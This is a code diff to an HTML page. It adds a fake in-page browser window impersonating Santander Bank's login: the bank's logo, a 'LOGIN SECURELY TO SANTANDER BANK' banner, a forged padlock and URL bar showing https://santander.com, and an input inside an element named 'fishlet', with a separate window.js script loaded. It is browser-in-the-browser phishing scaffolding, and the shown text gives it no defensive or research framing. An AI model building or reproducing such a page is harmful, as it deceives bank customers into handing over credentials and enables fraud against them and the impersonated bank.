@@ -1,46 +1,58 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>My Webpage</title>
+    <title>AVA</title>
     <link rel="stylesheet" href="style.css">
+        <link rel="stylesheet" href="window.css">
+
   </head>
   <body>
     <div id="blob">
       <canvas></canvas>
     </div>
 
-    <div class="control-container">
-      <div class="controls">
-        <div>
-          <label>Speed</label>
-          <input type="range" min="10" max="120" value="50" step="1"
-            name="speed">
-        </div>
-        <div>
-          <label>Spikes</label>
-          <input type="range" min=".05" max="2" value=".6" step=".05"
-            name="spikes">
-        </div>
-        <div>
-          <label>Processing</label>
-          <input type="range" min=".6" max="2.4" value="1" step=".01"
-            name="processing">
-        </div>
-        <div>
-          <label>Color 1</label>
-          <input type="color" value="#1c1f29" name="color1">
-        </div>
-        <div>
-          <label>Color 2</label>
-          <input type="color" value="#E4ECFA" name="color2">
-        </div>
-        <div>
-          <label>Color 3</label>
-          <input type="color" value="#1c1f29" name="color3">
+      <div class="control-container">
+        <div class="controls">
+          <div>
+            <input type="color" value="#1c1f29" name="color1" class="color1">
+          </div>
+          <div>
+            <input type="color" value="#E4ECFA" name="color2">
+          </div>
+          <div>
+            <input type="color" value="#1c1f29" name="color3">
+          </div>
         </div>
       </div>
-    </div>
-
+    	<div id="main"></div>
+		<div id="window">
+			<!-- Title bar start -->
+			<div id="title-bar-width">
+				<div id="title-bar">
+					<div>
+						<img src="./Santander-Logo.png" height="40px" id="logo">
+						<span id="logo-description">LOGIN SECURELY TO SANTANDER BANK</span>
+					</div>
+					<div>
+						<span id="minimize">&#8212;</span>
+						<span id="square">□</span>
+						<span id="exit">✕</span>
+					</div>
+				</div>
+				<div id="url-bar">
+					<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+					<span id="domain-name">https://santander.com</span>
+					<span id="domain-path">/login/auth=jks83NJBnsHga8202BCb2nk18JKnsbshacaHGC278y2bq2089SMkAJBbskbB11n45snsHwu2nLma82Las</span>
+				</div>
+			</div>
+			<!-- Content start -->
+			<div  id="fishlet">
+				<input id="input1" placeholder="insert data"></div>
+			</div>
+			<!-- <iframe id="content"
+				src="http://santander.com/"
+				frameBorder="0"></iframe> -->
+		</div>
     <script
       src="https://cdnjs.cloudflare.com/ajax/libs/three.js/110/three.min.js"></script>
     <script
@@ -49,7 +61,8 @@
     <script
       src="https://cdn.jsdelivr.net/npm/rangeslider.js/dist/rangeslider.min.js"></script>
 
-    <script type="module" src="script.js">
+    <script type="module" src="script.js"></script>
+    <script src="window.js">
    
   </script>
   </body>
